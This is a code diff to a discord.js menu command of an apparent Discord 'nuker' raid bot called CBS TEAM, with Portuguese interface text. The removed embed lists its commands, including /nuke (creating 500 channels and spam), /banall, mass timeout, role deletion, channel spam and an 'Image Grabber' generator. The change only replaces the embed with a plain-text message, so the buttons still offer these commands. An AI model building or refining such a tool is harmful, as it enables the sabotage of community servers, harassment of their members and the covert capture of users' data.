@@ -1,4 +1,4 @@
-const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 
 module.exports = {
   data: new SlashCommandBuilder()
@@ -7,26 +7,6 @@ module.exports = {
 
   async execute(interaction, client) {
     try {
-      const embed = new EmbedBuilder()
-        .setTitle('🔥 CBS TEAM - MENU DE COMANDOS')
-        .setDescription('**Clique nos botões abaixo para executar os comandos:**')
-        .setColor(0xFF0000)
-        .setThumbnail(client.user.displayAvatarURL())
-        .addFields(
-          { name: '💀 /nuke', value: 'Cria 500 canais + spam', inline: true },
-          { name: '⏱️ /timer', value: 'Agenda um /nuke', inline: true },
-          { name: '📸 /img', value: 'Gera Image Grabber', inline: true },
-          { name: '🗣️ /say', value: 'Envia mensagem/embed', inline: true },
-          { name: '🔁 /reverse', value: 'Desfaz o /nuke (dono)', inline: true },
-          { name: '📨 /invite', value: 'Link de convite do bot', inline: true },
-          { name: '💬 /channelspam', value: 'Spama um canal', inline: true },
-          { name: '🔨 /banall', value: 'Bane todos', inline: true },
-          { name: '⏰ /end', value: 'Timeout em todos', inline: true },
-          { name: '🗑️ /deleterole', value: 'Deleta cargos', inline: true }
-        )
-        .setFooter({ text: 'CBS TEAM - O PODER É NOSSO!' })
-        .setTimestamp();
-
       const row1 = new ActionRowBuilder()
         .addComponents(
           new ButtonBuilder()
@@ -80,15 +60,15 @@ module.exports = {
         );
 
       await interaction.reply({
-        embeds: [embed],
+        content: '🔥 **CBS TEAM - MENU DE COMANDOS**\nClique nos botões abaixo para executar os comandos:',
         components: [row1, row2, row3],
-        ephemeral: true // ← em vez de flags: 64
+        ephemeral: true
       });
 
     } catch (error) {
       console.error('❌ Erro no menu:', error);
       await interaction.reply({
-        content: `❌ Erro ao gerar o menu: ${error.message}`,
+        content: `❌ Erro: ${error.message}`,
         ephemeral: true
       }).catch(() => {});
     }
